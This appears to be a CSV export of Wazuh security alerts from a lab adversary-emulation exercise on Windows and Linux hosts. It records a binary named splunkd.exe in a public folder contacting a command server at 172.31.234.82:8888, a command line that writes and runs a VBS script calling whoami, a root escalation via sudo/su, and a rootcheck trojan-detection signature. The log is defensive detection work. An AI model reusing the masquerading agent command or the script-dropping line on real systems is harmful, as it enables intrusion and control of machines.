wazuh-alerts-4.x-2024.12.10,ufRRspMBtNh2X6vnUd-R,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:16.296
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\6IYNEI2H\svg-al.76ab0665176c28798fba[1].js
CreationUtcTime: 2024-12-10 17:41:16.296
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:16.3007409Z,8577,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,120,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:17.046",EventChannel,1733852477,"Dec 10, 2024 @ 17:41:17.046", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:16.3, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\6IYNEI2H\\svg-al.76ab0665176c28798fba[1].js,41:16.3, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,vfRRspMBtNh2X6vnUd-R,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:16.300
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\6IYNEI2H\svg-a0.51fd603284ecc1c8b35c[1].js
CreationUtcTime: 2024-12-10 17:41:16.296
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:16.3013984Z,8579,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,124,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:17.089",EventChannel,1733852477,"Dec 10, 2024 @ 17:41:17.089", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:16.3, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\6IYNEI2H\\svg-a0.51fd603284ecc1c8b35c[1].js,41:16.3, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,wfRRspMBtNh2X6vnUd-R,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.007,technique_name=JavaScript
UtcTime: 2024-12-10 17:41:16.560
ProcessGuid: {15959494-7d2b-6758-0702-000000000300}
ProcessId: 6836
Image: C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
TargetFilename: C:\Users\mari\AppData\Local\Packages\Microsoft.Windows.Search_cw5n1h2txyewy\AC\INetCache\C4W3GX6O\svg-ay.dc6ae68ff9a7290ef672[1].js
CreationUtcTime: 2024-12-10 17:41:16.560
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:41:16.5652318Z,8584,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,128,FALSE,6,Scripting file created under Windows Temp or User folder,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92200,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:17.152",EventChannel,1733852477,"Dec 10, 2024 @ 17:41:17.152", , , , , , ,C:\\Windows\\SystemApps\\Microsoft.Windows.Search_cw5n1h2txyewy\\SearchApp.exe, , , , , , ,{15959494-7d2b-6758-0702-000000000300},6836,41:16.6, ,"technique_id=T1059.007,technique_name=JavaScript", , ,DESKTOP-QGB4EQH\\mari,"[""Command and Scripting Interpreter"",""Ingress Tool Transfer""]","[""T1059"",""T1105""]","[""Execution"",""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Packages\\Microsoft.Windows.Search_cw5n1h2txyewy\\AC\\INetCache\\C4W3GX6O\\svg-ay.dc6ae68ff9a7290ef672[1].js,41:16.6, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,yfRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 17:41:33.479
ProcessGuid: {15959494-7d4d-6758-0902-000000000300}
ProcessId: 5348
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C c:\windows\system32\cmd.exe /c cd /d %%TEMP%%\ & echo Set objShell = CreateObject(""WScript.Shell""):Set objExec = objShell.Exec(""whoami""):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7c97-6758-b201-000000000300}
ParentProcessId: 9140
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:41:33.4863876Z,8593,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,5,FALSE,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:34.317",EventChannel,1733852494,"Dec 10, 2024 @ 17:41:34.317", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-7d4d-6758-0902-000000000300},5348,41:33.5,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , , , , , , , , , ,{15959494-7c97-6758-b201-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0xeacdd,9140,C:\\Users\\mari\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C c:\\windows\\system32\\cmd.exe /c cd /d %%TEMP%%\\ &amp; echo Set objShell = CreateObject(\""WScript.Shell\""):Set objExec = objShell.Exec(\""whoami\""):Set objExec = Nothing:Set objShell = Nothing &gt; AtomicTest.vbs &amp; AtomicTest.vbs",Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,yvRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 17:41:33.506
ProcessGuid: {15959494-7d4d-6758-0a02-000000000300}
ProcessId: 4824
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: c:\windows\system32\cmd.exe  /c cd /d C:\Users\mari\AppData\Local\Temp\ 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7d4d-6758-0902-000000000300}
ParentProcessId: 5348
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject(""WScript.Shell""):Set objExec = objShell.Exec(""whoami""):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:41:33.5076249Z,8596,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,4,FALSE,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:34.409",EventChannel,1733852494,"Dec 10, 2024 @ 17:41:34.409", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-7d4d-6758-0a02-000000000300},4824,41:33.5,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , , , , , , , , , ,{15959494-7d4d-6758-0902-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"cmd.exe /C c:\\windows\\system32\\cmd.exe /c cd /d %TEMP%\\ &amp; echo Set objShell = CreateObject(\""WScript.Shell\""):Set objExec = objShell.Exec(\""whoami\""):Set objExec = Nothing:Set objShell = Nothing &gt; AtomicTest.vbs &amp; AtomicTest.vbs",0xeacdd,5348,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,c:\\windows\\system32\\cmd.exe  /c cd /d C:\\Users\\mari\\AppData\\Local\\Temp\\,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,zfRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1033,technique_name=System Owner/User Discovery
UtcTime: 2024-12-10 17:41:34.093
ProcessGuid: {15959494-7d4e-6758-0c02-000000000300}
ProcessId: 4308
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.19041.1 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: whoami
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=1915FBFDB73FDD200C47880247ACDDE5442431A9,MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88
ParentProcessGuid: {15959494-7d4d-6758-0b02-000000000300}
ParentProcessId: 8928
ParentImage: C:\Windows\System32\wscript.exe
ParentCommandLine: ""C:\WINDOWS\System32\WScript.exe"" ""C:\Users\mari\AtomicTest.vbs"" 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:41:34.1016091Z,8608,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,1,FALSE,4,Scripting interpreter spawned a new process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92000,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:34.607",EventChannel,1733852494,"Dec 10, 2024 @ 17:41:34.607", , , , , ,whoami.exe,C:\\Windows\\System32\\whoami.exe,Microsoft® Windows® Operating System, , ,whoami - displays logged on user information, , ,{15959494-7d4e-6758-0c02-000000000300},4308,41:34.1,"SHA1=1915FBFDB73FDD200C47880247ACDDE5442431A9,MD5=A4A6924F3EAF97981323703D38FD99C4,SHA256=1D4902A04D99E8CCBFE7085E63155955FEE397449D386453F6C452AE407B8743,IMPHASH=7FF0758B766F747CE57DFAC70743FB88","technique_id=T1033,technique_name=System Owner/User Discovery",Microsoft Corporation,10.0.19041.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Visual Basic""]","[""T1059.005""]","[""Execution""]", , , , , , , , , , , ,{15959494-7d4d-6758-0b02-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"\""C:\\WINDOWS\\System32\\WScript.exe\"" \""C:\\Users\\mari\\AtomicTest.vbs\""",0xeacdd,8928,C:\\Users\\mari\\,C:\\Windows\\System32\\wscript.exe,whoami,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,z_RRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,1,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-12-10 17:41:35.498
ProcessGuid: {15959494-7d4f-6758-0f02-000000000300}
ProcessId: 5904
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.19041.4355 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: c:\windows\system32\cmd.exe  /c cd /d C:\Users\mari\AppData\Local\Temp\ 
CurrentDirectory: C:\Users\mari\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-7b75-6758-ddac-0e0000000000}
LogonId: 0xEACDD
TerminalSessionId: 1
IntegrityLevel: Medium
Hashes: SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18
ParentProcessGuid: {15959494-7d4f-6758-0e02-000000000300}
ParentProcessId: 6236
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C c:\windows\system32\cmd.exe /c cd /d %TEMP%\ & echo Set objShell = CreateObject(""WScript.Shell""):Set objExec = objShell.Exec(""whoami""):Set objExec = Nothing:Set objShell = Nothing > AtomicTest.vbs & AtomicTest.vbs
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-12-10T17:41:35.4990715Z,8615,3880,DESKTOP-QGB4EQH,1,2624,INFORMATION,Microsoft-Windows-Sysmon,5,FALSE,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:35.478",EventChannel,1733852495,"Dec 10, 2024 @ 17:41:35.478", , , , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-7d4f-6758-0f02-000000000300},5904,41:35.5,"SHA1=DF79C86FDD11B9CCB89148458E509F879C72566C,MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.19041.4355 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , , , , , , , , , ,{15959494-7d4f-6758-0e02-000000000300},{15959494-7b75-6758-ddac-0e0000000000},"cmd.exe /C c:\\windows\\system32\\cmd.exe /c cd /d %TEMP%\\ &amp; echo Set objShell = CreateObject(\""WScript.Shell\""):Set objExec = objShell.Exec(\""whoami\""):Set objExec = Nothing:Set objShell = Nothing &gt; AtomicTest.vbs &amp; AtomicTest.vbs",0xeacdd,6236,C:\\Users\\mari\\,C:\\Windows\\System32\\cmd.exe,c:\\windows\\system32\\cmd.exe  /c cd /d C:\\Users\\mari\\AppData\\Local\\Temp\\,Medium,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,1PRRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,7,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""Image loaded:
RuleName: technique_id=T1053,technique_name=Scheduled Task
UtcTime: 2024-12-10 17:41:46.167
ProcessGuid: {15959494-7d5a-6758-1302-000000000300}
ProcessId: 588
Image: C:\Windows\System32\svchost.exe
ImageLoaded: C:\Windows\System32\taskschd.dll
FileVersion: 10.0.19041.3636 (WinBuild.160101.0800)
Description: Task Scheduler COM API
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: taskschd.dll
Hashes: SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: NT AUTHORITY\SYSTEM""",3,2024-12-10T17:41:46.1699271Z,8643,3880,DESKTOP-QGB4EQH,7,2624,INFORMATION,Microsoft-Windows-Sysmon,16,FALSE,4,Process loaded taskschd.dll module. May be used to create delayed malware execution,"[""sysmon"",""sysmon_eid7_detections"",""windows""]",92154,windows_eventchannel,log,"Dec 10, 2024 @ 17:41:46.903",EventChannel,1733852506,"Dec 10, 2024 @ 17:41:46.903", , , , , ,taskschd.dll,C:\\Windows\\System32\\svchost.exe,Microsoft® Windows® Operating System,Microsoft Windows,C:\\Windows\\System32\\taskschd.dll,Task Scheduler COM API,TRUE,Valid,{15959494-7d5a-6758-1302-000000000300},588,41:46.2,"SHA1=633C92F5A5000CDE3235C7FDC306B2B04C501C48,MD5=84F942C1A4BD60C94EBEC6643E0216C9,SHA256=BBE733452E6CE871D5D2064948847AAB2A71F7FEDA2C962BA4002F64E2D198F2,IMPHASH=B7A4477FA36E2E5287EE76AC4AFCB05B","technique_id=T1053,technique_name=Scheduled Task",Microsoft Corporation,10.0.19041.3636 (WinBuild.160101.0800),NT AUTHORITY\\SYSTEM,"[""Scheduled Task""]","[""T1053.005""]","[""Execution"",""Persistence"",""Privilege Escalation""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,1fRRspMBtNh2X6vnUd_c,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,3,Successful sudo to ROOT executed.,"[""syslog"",""sudo""]",5402,sudo,log,"Dec 10, 2024 @ 17:41:51.309",/var/log/auth.log,1733852511,"Dec 10, 2024 @ 17:41:51.309", , , ,"[""IV_32.2""]","[""7.6"",""7.8"",""7.13""]", , , , , , , , , , , , , , , , ,"[""Abuse Elevation Control Mechanism""]","[""T1548""]","[""Privilege Escalation"",""Defense Evasion""]", , , , , , ,"[""10.2.5"",""10.2.2""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.14"",""AC.7"",""AC.6""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Dec 10 21:11:49 Maryam sudo:     mari : TTY=pts/3 ; PWD=/home/mari ; USER=root ; COMMAND=/usr/bin/su,Maryam,sudo,12/10/2024 21:11,mari,root,pts/3,/home/mari,/usr/bin/su,sudo,First time user executed the sudo command, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,1vRRspMBtNh2X6vnUd_c,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,3,PAM: Login session opened.,"[""pam"",""syslog"",""authentication_success""]",5501,pam,log,"Dec 10, 2024 @ 17:41:51.309",/var/log/auth.log,1733852511,"Dec 10, 2024 @ 17:41:51.309", , , ,"[""IV_32.2""]","[""7.8"",""7.9""]", , , , , , , , , , , , , , , , ,"[""Valid Accounts""]","[""T1078""]","[""Defense Evasion"",""Persistence"",""Privilege Escalation"",""Initial Access""]", , , , , , ,"[""10.2.5""]","[""164.312.b""]","[""CC6.8"",""CC7.2"",""CC7.3""]","[""AU.14"",""AC.7""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,Dec 10 21:11:50 Maryam su: pam_unix(su:session): session opened for user root(uid=0) by mari(uid=0),Maryam,su,12/10/2024 21:11,mari,root(uid=0), , , ,pam, ,0, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,2fRRspMBtNh2X6vnUd_c,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,7,Host-based anomaly detection event (rootcheck).,"[""ossec"",""rootcheck""]",510,rootcheck,log,"Dec 10, 2024 @ 17:42:31.200",rootcheck,1733852551,"Dec 10, 2024 @ 17:42:31.200", , , ,"[""IV_35.7.d""]", , , , , , , , , , , , , , , , , , , , , , , , , , ,"[""10.6.1""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,/bin/diff,Trojaned version of file detected.,Trojaned version of file '/bin/diff' detected. Signature used: 'bash|^/bin/sh|file\.h|proc\.h|/dev/[^n]|^/bin/.*sh' (Generic)., , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,7_RRspMBtNh2X6vnUd_c,1,1,192.168.117.136,window-agent3,3,Maryam, , , ,11,0x8000000000000000,{5770385f-c22a-43e0-bf4c-06f5698ffbd9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-12-10 17:46:49.627
ProcessGuid: {15959494-7e89-6758-7c02-000000000300}
ProcessId: 7504
Image: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_2xfwopav.nz4.ps1
CreationUtcTime: 2024-12-10 17:46:49.627
User: DESKTOP-QGB4EQH\mari""",2,2024-12-10T17:46:49.6303035Z,8978,3880,DESKTOP-QGB4EQH,11,2624,INFORMATION,Microsoft-Windows-Sysmon,7,TRUE,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213,windows_eventchannel,log,"Dec 10, 2024 @ 17:46:51.114",EventChannel,1733852811,"Dec 10, 2024 @ 17:46:51.114", , , , , , ,C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-7e89-6758-7c02-000000000300},7504,46:49.6, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_2xfwopav.nz4.ps1,46:49.6, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.12.10,9PRRspMBtNh2X6vnUd_c,1,1, ,Maryam,0,Maryam, , , , , , , , , , , , , , , , , , , ,1,FALSE,7,Host-based anomaly detection event (rootcheck).,"[""ossec"",""rootcheck""]",510,rootcheck,log,"Dec 10, 2024 @ 17:48:02.559",rootcheck,1733852882,"Dec 10, 2024 @ 17:48:02.559", , , ,"[""IV_35.7.d""]", , , , , , , , , , , , , , , , , , , , , , , , , , ,"[""10.6.1""]", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,/bin/diff,Trojaned version of file detected.,Trojaned version of file '/bin/diff' detected. Signature used: 'bash|^/bin/sh|file\.h|proc\.h|/dev/[^n]|^/bin/.*sh' (Generic)., , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
